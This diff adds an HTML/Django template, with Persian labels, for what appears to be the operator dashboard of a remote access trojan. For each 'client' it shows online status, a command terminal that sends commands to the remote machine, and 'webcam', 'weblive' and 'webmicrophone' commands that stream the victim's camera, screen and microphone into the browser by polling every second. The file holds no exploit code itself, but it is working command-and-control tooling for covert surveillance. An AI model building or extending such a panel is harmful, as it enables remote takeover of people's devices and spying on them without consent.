@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CMD: {{ client.client_id }}</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://v1.fontapi.ir/css/Vazir">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <style>
+        * {
+            font-family: 'Vazir', 'Courier New', monospace;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: #0d1b2a;
+            color: #e0e0e0;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        .gradient-bg {
+            background: linear-gradient(135deg, #0d1b2a, #1b263b);
+            min-height: 100vh;
+            width: 100%;
+            padding: 0.5rem;
+        }
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            transition: all 0.3s ease;
+        }
+        .glass-button {
+            background: linear-gradient(135deg, rgba(64, 196, 255, 0.3), rgba(123, 44, 191, 0.3));
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(64, 196, 255, 0.5);
+            color: #e0e0e0;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.9rem;
+        }
+        .glass-button:hover {
+            background: linear-gradient(135deg, rgba(64, 196, 255, 0.5), rgba(123, 44, 191, 0.5));
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+        .terminal-window {
+            position: relative;
+            width: 100%;
+            max-width: 800px;
+            height: 500px;
+            margin: 1rem auto;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeSlideIn 0.5s ease forwards;
+        }
+        @keyframes fadeSlideIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .terminal-header {
+            background: rgba(27, 38, 59, 0.8);
+            padding: 0.5rem 1rem;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        .terminal-title {
+            font-weight: bold;
+            color: #40c4ff;
+        }
+        .terminal-close {
+            color: #dc3545;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .terminal-close:hover {
+            transform: scale(1.2);
+        }
+        .terminal-body {
+            background: rgba(0, 0, 0, 0.7);
+            height: calc(100% - 40px);
+            border-radius: 0 0 12px 12px;
+            padding: 1rem;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+        }
+        .terminal-output {
+            white-space: pre-wrap;
+            margin-bottom: 1rem;
+            line-height: 1.5;
+        }
+        .terminal-input {
+            display: flex;
+            align-items: center;
+            margin-top: 0.5rem;
+        }
+        .terminal-prompt {
+            color: #0f0;
+            margin-left: 0.5rem;
+        }
+        .terminal-command {
+            flex-grow: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            outline: none;
+            caret-color: #0f0;
+        }
+        .stream-window {
+            position: absolute;
+            width: 400px;
+            height: 300px;
+            z-index: 100;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeSlideIn 0.5s ease forwards;
+        }
+        .stream-header {
+            background: rgba(27, 38, 59, 0.8);
+            padding: 0.5rem 1rem;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+            cursor: move;
+        }
+        .stream-title {
+            font-weight: bold;
+            color: #40c4ff;
+        }
+        .stream-body {
+            background: rgba(0, 0, 0, 0.7);
+            height: calc(100% - 40px);
+            border-radius: 0 0 12px 12px;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .stream-image {
+            max-width: 100%;
+            max-height: 80%;
+            border-radius: 8px;
+        }
+        .stream-audio {
+            width: 100%;
+            margin-top: 1rem;
+        }
+        .mic-icon {
+            font-size: 3rem;
+            color: #0f0;
+            margin-bottom: 1rem;
+        }
+        .error-message {
+            color: #dc3545;
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .new-terminal-btn {
+            position: fixed;
+            bottom: 1.5rem;
+            left: 1.5rem;
+            z-index: 10;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
+            margin-right: 0.5rem;
+        }
+        .status-online {
+            background-color: rgba(40, 167, 69, 0.2);
+            color: #28a745;
+        }
+        .status-offline {
+            background-color: rgba(220, 53, 69, 0.2);
+            color: #dc3545;
+        }
+        @media (max-width: 768px) {
+            .terminal-window {
+                height: 400px;
+                margin: 0.5rem;
+            }
+            .stream-window {
+                width: 300px;
+                height: 250px;
+            }
+            .new-terminal-btn {
+                bottom: 1rem;
+                left: 1rem;
+                padding: 0.5rem 1rem;
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body class="gradient-bg">
+    {% if client %}
+        <div class="terminal-window glass-effect" id="terminal-1">
+            <div class="terminal-header">
+                <div class="terminal-title">
+                    <span class="status-badge {% if client.is_online %}status-online{% else %}status-offline{% endif %}">
+                        {% if client.is_online %}آنلاین{% else %}آفلاین{% endif %}
+                    </span>
+                    CMD: {{ client.client_id }}
+                </div>
+                <div class="terminal-close" onclick="closeWindow('terminal-1')">
+                    <i class="bi bi-x-lg"></i>
+                </div>
+            </div>
+            <div class="terminal-body">
+                <div class="terminal-output" id="output-1">
+                    {% if client.last_output %}
+                        {{ client.last_output|linebreaks }}
+                    {% else %}
+                        Welcome to CMD for {{ client.client_id }}...
+                    {% endif %}
+                </div>
+                <div class="terminal-input">
+                    <span class="terminal-prompt">></span>
+                    <input type="text" class="terminal-command" id="command-1" autofocus 
+                           onkeydown="if(event.key === 'Enter') sendCommand('terminal-1')">
+                </div>
+            </div>
+        </div>
+
+        <button class="new-terminal-btn glass-button" onclick="openNewTerminal()">
+            <i class="bi bi-plus-lg"></i> ترمینال جدید
+        </button>
+
+        <script>
+            let terminalCount = 1;
+            const windows = {};
+
+            // Initialize GSAP animations
+            gsap.from(".terminal-window", {
+                duration: 0.7,
+                y: 30,
+                opacity: 0,
+                ease: "back.out(1.7)"
+            });
+
+            function sendCommand(terminalId) {
+                const commandInput = document.getElementById(`command-${terminalId.split('-')[1]}`);
+                const command = commandInput.value.trim();
+                if (!command) return;
+
+                const outputDiv = document.getElementById(`output-${terminalId.split('-')[1]}`);
+                outputDiv.innerHTML += `\n<span style="color:#0f0">> ${command}</span>\n`;
+
+                fetch(`/api/command/{{ client.client_id }}/`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRFToken': '{{ csrf_token }}'
+                    },
+                    body: JSON.stringify({ command })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.output) {
+                        if (command.toLowerCase() === 'webcam' || command.toLowerCase() === 'weblive') {
+                            if (data.output && !data.output.startsWith('Error')) {
+                                openStreamWindow(command.toLowerCase(), terminalId);
+                                outputDiv.innerHTML += '<span style="color:#40c4ff">Stream started in new window...</span>\n';
+                            } else {
+                                outputDiv.innerHTML += `<span style="color:#dc3545">${data.output}</span>\n`;
+                            }
+                        } else if (command.toLowerCase() === 'webmicrophone') {
+                            if (data.output && !data.output.startsWith('Error')) {
+                                openStreamWindow('webmicrophone', terminalId);
+                                outputDiv.innerHTML += '<span style="color:#40c4ff">Audio stream started in new window...</span>\n';
+                            } else {
+                                outputDiv.innerHTML += `<span style="color:#dc3545">${data.output}</span>\n`;
+                            }
+                        } else {
+                            outputDiv.innerHTML += `${data.output}\n`;
+                        }
+                    } else {
+                        outputDiv.innerHTML += '<span style="color:#ffc107">Waiting for client response...</span>\n';
+                    }
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                    commandInput.value = '';
+                })
+                .catch(error => {
+                    outputDiv.innerHTML += `<span style="color:#dc3545">Error: ${error.message}</span>\n`;
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                });
+            }
+
+            function openStreamWindow(type, terminalId) {
+                const windowId = `${type}-${terminalId.split('-')[1]}`;
+                if (windows[windowId]) return;
+
+                const streamWindow = document.createElement('div');
+                streamWindow.className = 'stream-window glass-effect';
+                streamWindow.id = windowId;
+                streamWindow.style.left = `${100 + Math.random() * 200}px`;
+                streamWindow.style.top = `${100 + Math.random() * 200}px`;
+                streamWindow.innerHTML = `
+                    <div class="stream-header">
+                        <div class="stream-title">${type.toUpperCase()}</div>
+                        <div class="terminal-close" onclick="closeWindow('${windowId}')">
+                            <i class="bi bi-x-lg"></i>
+                        </div>
+                    </div>
+                    <div class="stream-body">
+                        ${type === 'webmicrophone' ? 
+                            '<div class="mic-icon">🎤</div><audio class="stream-audio" id="audio-${windowId}" controls autoplay></audio>' : 
+                            '<img class="stream-image" id="image-${windowId}" src=""><div class="error-message" id="error-${windowId}"></div>'}
+                    </div>
+                `;
+                document.body.appendChild(streamWindow);
+                makeDraggable(streamWindow);
+                windows[windowId] = true;
+
+                gsap.from(`#${windowId}`, {
+                    duration: 0.5,
+                    y: 20,
+                    opacity: 0,
+                    ease: "back.out(1.7)"
+                });
+
+                if (type === 'webcam' || type === 'weblive') {
+                    startPolling(windowId, `/api/stream/{{ client.client_id }}/${type}/`, 'image');
+                } else if (type === 'webmicrophone') {
+                    startPolling(windowId, `/api/stream/{{ client.client_id }}/webmicrophone/`, 'audio');
+                }
+            }
+
+            function closeWindow(id) {
+                const element = document.getElementById(id);
+                if (element) {
+                    gsap.to(element, {
+                        duration: 0.3,
+                        opacity: 0,
+                        y: 20,
+                        onComplete: () => element.remove()
+                    });
+                    if (id.startsWith('web')) {
+                        windows[id] = false;
+                    }
+                }
+            }
+
+            function openNewTerminal() {
+                terminalCount++;
+                const newTerminal = document.createElement('div');
+                newTerminal.className = 'terminal-window glass-effect';
+                newTerminal.id = `terminal-${terminalCount}`;
+                newTerminal.style.left = `${50 + Math.random() * 200}px`;
+                newTerminal.style.top = `${50 + Math.random() * 200}px`;
+                newTerminal.innerHTML = `
+                    <div class="terminal-header">
+                        <div class="terminal-title">
+                            <span class="status-badge {% if client.is_online %}status-online{% else %}status-offline{% endif %}">
+                                {% if client.is_online %}آنلاین{% else %}آفلاین{% endif %}
+                            </span>
+                            CMD: {{ client.client_id }}
+                        </div>
+                        <div class="terminal-close" onclick="closeWindow('terminal-${terminalCount}')">
+                            <i class="bi bi-x-lg"></i>
+                        </div>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-output" id="output-${terminalCount}">
+                            Welcome to CMD for {{ client.client_id }}...
+                        </div>
+                        <div class="terminal-input">
+                            <span class="terminal-prompt">></span>
+                            <input type="text" class="terminal-command" id="command-${terminalCount}" autofocus 
+                                   onkeydown="if(event.key === 'Enter') sendCommand('terminal-${terminalCount}')">
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(newTerminal);
+                makeDraggable(newTerminal);
+
+                gsap.from(`#terminal-${terminalCount}`, {
+                    duration: 0.5,
+                    y: 20,
+                    opacity: 0,
+                    ease: "back.out(1.7)"
+                });
+            }
+
+            function startPolling(windowId, url, type) {
+                const intervalId = setInterval(() => {
+                    if (!windows[windowId]) {
+                        clearInterval(intervalId);
+                        return;
+                    }
+                    
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(data => {
+                            const errorDiv = document.getElementById(`error-${windowId}`);
+                            if (data.data && !data.data.startsWith('Error')) {
+                                if (type === 'image') {
+                                    const img = document.getElementById(`image-${windowId}`);
+                                    img.src = `data:image/jpeg;base64,${data.data}`;
+                                    if (errorDiv) errorDiv.innerHTML = '';
+                                } else if (type === 'audio') {
+                                    const audio = document.getElementById(`audio-${windowId}`);
+                                    audio.src = `data:audio/wav;base64,${data.data}`;
+                                    if (errorDiv) errorDiv.innerHTML = '';
+                                }
+                            } else {
+                                if (errorDiv) {
+                                    errorDiv.innerHTML = data.data || 'No data received from client';
+                                }
+                            }
+                        })
+                        .catch(error => {
+                            const errorDiv = document.getElementById(`error-${windowId}`);
+                            if (errorDiv) errorDiv.innerHTML = `Error: ${error.message}`;
+                        });
+                }, 1000);
+            }
+
+            function makeDraggable(element) {
+                let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+                const header = element.querySelector('.terminal-header') || element.querySelector('.stream-header');
+                header.onmousedown = dragMouseDown;
+
+                function dragMouseDown(e) {
+                    e.preventDefault();
+                    pos3 = e.clientX;
+                    pos4 = e.clientY;
+                    document.onmouseup = closeDragElement;
+                    document.onmousemove = elementDrag;
+                }
+
+                function elementDrag(e) {
+                    e.preventDefault();
+                    pos1 = pos3 - e.clientX;
+                    pos2 = pos4 - e.clientY;
+                    pos3 = e.clientX;
+                    pos4 = e.clientY;
+                    element.style.top = (element.offsetTop - pos2) + "px";
+                    element.style.left = (element.offsetLeft - pos1) + "px";
+                }
+
+                function closeDragElement() {
+                    document.onmouseup = null;
+                    document.onmousemove = null;
+                }
+            }
+        </script>
+    {% else %}
+        <div class="terminal-window glass-effect">
+            <div class="terminal-header">
+                <div class="terminal-title">خطا</div>
+            </div>
+            <div class="terminal-body">
+                <div class="terminal-output" style="color:#dc3545">
+                    کلاینت یافت نشد
+                </div>
+            </div>
+        </div>
+    {% endif %}
+</body>
+</html>
